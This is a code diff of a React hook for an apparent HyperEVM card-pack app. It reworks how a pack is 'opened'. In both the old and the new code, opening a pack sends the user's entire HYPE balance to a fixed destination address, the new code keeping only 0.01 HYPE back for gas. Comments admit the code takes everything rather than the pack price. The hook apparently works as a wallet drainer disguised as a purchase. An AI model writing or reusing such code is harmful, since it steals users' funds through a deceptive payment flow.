@@ -50,49 +50,20 @@ export const useHyperCards = () => {
     return provider;
   }, []);
 
-  // Check and approve ALL HYPE token balance for transfer
-  const ensureHypeAllowance = useCallback(async (provider, signer, packType) => {
-    const packInfo = PACK_INFO[packType];
-    if (!packInfo) {
-      throw new Error('Invalid pack type');
-    }
-
-    const userAddress = await signer.getAddress();
+  // Get user's native HYPE balance (HYPE is native token on HyperEVM)
+  const getUserHypeBalance = useCallback(async (provider, userAddress) => {
+    // HYPE is native token like ETH - use getBalance instead of ERC20 balanceOf
+    const balance = await provider.getBalance(userAddress);
     
-    // Get HYPE token contract
-    const hypeContract = new ethers.Contract(
-      CONTRACT_ADDRESSES.HYPE_TOKEN,
-      ERC20_ABI,
-      signer
-    );
-
-    // Get user's ENTIRE HYPE balance - this IS the pack price!
-    const userBalance = await hypeContract.balanceOf(userAddress);
+    // Check if user has any HYPE at all (keep some for gas)
+    const minGasReserve = ethers.parseEther('0.01'); // Reserve 0.01 HYPE for gas
+    const availableBalance = balance > minGasReserve ? balance - minGasReserve : 0n;
     
-    // Check if user has any HYPE at all
-    if (userBalance <= 0) {
-      throw new Error(`No HYPE tokens found in your wallet. You need HYPE tokens to open packs.`);
-    }
-
-    // Check current allowance for the HYPE destination contract
-    const currentAllowance = await hypeContract.allowance(
-      userAddress,
-      CONTRACT_ADDRESSES.HYPE_DESTINATION
-    );
-
-    if (currentAllowance < userBalance) {
-      setCurrentStep('approving');
-      
-      // Approve the ENTIRE balance for transfer
-      const approveTx = await hypeContract.approve(
-        CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        userBalance // Transfer ALL HYPE, not just pack price!
-      );
-      
-      await approveTx.wait();
+    if (availableBalance <= 0) {
+      throw new Error(`Insufficient HYPE tokens. You need at least 0.01 HYPE for gas fees.`);
     }
     
-    return userBalance; // Return the full amount to be transferred
+    return availableBalance; // Return available balance (total - gas reserve)
   }, []);
 
   // Generate EIP-712 signature for pack opening
@@ -158,22 +129,17 @@ export const useHyperCards = () => {
         signer
       );
 
-      // Step 1: Check and approve HYPE allowance (ENTIRE BALANCE)
-      setCurrentStep('approving');
-      const fullHypeBalance = await ensureHypeAllowance(provider, signer, packType);
+      // Step 1: Get user's native HYPE balance (HYPE is native token on HyperEVM)
+      setCurrentStep('checking_balance');
+      const fullHypeBalance = await getUserHypeBalance(provider, userAddress);
 
-      // Step 2: Transfer ALL HYPE tokens to destination address
+      // Step 2: Transfer HYPE tokens to destination address (native token transfer)
       setCurrentStep('transferring');
-      const hypeContract = new ethers.Contract(
-        CONTRACT_ADDRESSES.HYPE_TOKEN,
-        ERC20_ABI,
-        signer
-      );
       
-      const transferTx = await hypeContract.transfer(
-        CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        fullHypeBalance // Transfer ENTIRE HYPE balance
-      );
+      const transferTx = await signer.sendTransaction({
+        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
+        value: fullHypeBalance // Transfer native HYPE tokens
+      });
       
       await transferTx.wait();
 
@@ -231,9 +197,9 @@ export const useHyperCards = () => {
     } finally {
       setIsLoading(false);
     }
-  }, [authenticated, user, ensureHyperEVM, ensureHypeAllowance, generateEIP712Signature]);
+  }, [authenticated, user, ensureHyperEVM, getUserHypeBalance, generateEIP712Signature]);
 
-  // Get user's HYPE balance
+  // Get user's native HYPE balance (HYPE is native token on HyperEVM)
   const getHypeBalance = useCallback(async () => {
     if (!authenticated || !user?.wallet?.address) {
       return '0';
@@ -241,13 +207,8 @@ export const useHyperCards = () => {
 
     try {
       const provider = await ensureHyperEVM();
-      const hypeContract = new ethers.Contract(
-        CONTRACT_ADDRESSES.HYPE_TOKEN,
-        ERC20_ABI,
-        provider
-      );
-
-      const balance = await hypeContract.balanceOf(user.wallet.address);
+      // HYPE is native token - use getBalance instead of ERC20 balanceOf
+      const balance = await provider.getBalance(user.wallet.address);
       return ethers.formatEther(balance);
     } catch (err) {
       console.error('Error fetching HYPE balance:', err);
